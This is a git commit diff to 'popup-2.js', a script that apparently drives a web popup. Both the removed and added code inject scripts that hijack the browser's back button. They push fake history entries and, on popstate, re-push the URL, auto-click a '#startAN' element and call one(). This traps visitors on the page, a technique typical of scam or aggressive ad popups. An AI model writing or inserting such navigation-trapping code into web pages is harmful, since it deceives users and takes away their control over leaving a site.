088ab252cadb1555de8576f1caaf2e9eb703ec9e
Ross Cruz <110272080+rosswcruz@users.noreply.github.com>
2024-03-01 18:36:48 +0530

    Update popup-2.js

--- popup-2.js
+++ popup-2.js
@@ -1,4 +1,3 @@
-
 var styles1 = `
 
 *, *::after, *::before {
@@ -1033,9 +1032,9 @@ scriptZQ.innerHTML=`
 
 window.history.pushState(null, null, window.location.href);
 window.onpopstate = function () {
-one();
 document.querySelector('#startAN').click();
 setTimeout(function scroll() { window.scrollTo(0, 0); }, 200);
+one();
 };
 
 `;
@@ -1043,30 +1042,19 @@ document.getElementsByTagName('body')[0].appendChild(scriptZQ);
 
 } else {
 
-var scriptZA = document.createElement("script");
-scriptZA.type="text/javascript";
-scriptZA.innerHTML=`
+var scriptZT = document.createElement("script");
+scriptZT.type="text/javascript";
+scriptZT.innerHTML=`
 
-! function () { var t; try { for (t = 0; 10 > t; ++t) history.pushState({}, ""); onpopstate = function (t) { t.state && history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
-history.go(1);
-}); } } catch (o) {} }();
-
-`;
-document.getElementsByTagName('body')[0].appendChild(scriptZA);
-
-var scriptZQ = document.createElement("script");
-scriptZQ.type="text/javascript";
-scriptZQ.innerHTML=`
-
-window.history.pushState(null, null, window.location.href);
-window.onpopstate = function () {
-one();
+history.pushState(null, null, document.URL); window.addEventListener('popstate', function () {
+history.pushState(null, null, document.URL);
 document.querySelector('#startAN').click();
 setTimeout(function scroll() { window.scrollTo(0, 0); }, 200);
-};
+one();
+});
 
 `;
-document.getElementsByTagName('body')[0].appendChild(scriptZQ);
+document.getElementsByTagName('body')[0].appendChild(scriptZT);
 
 };
 
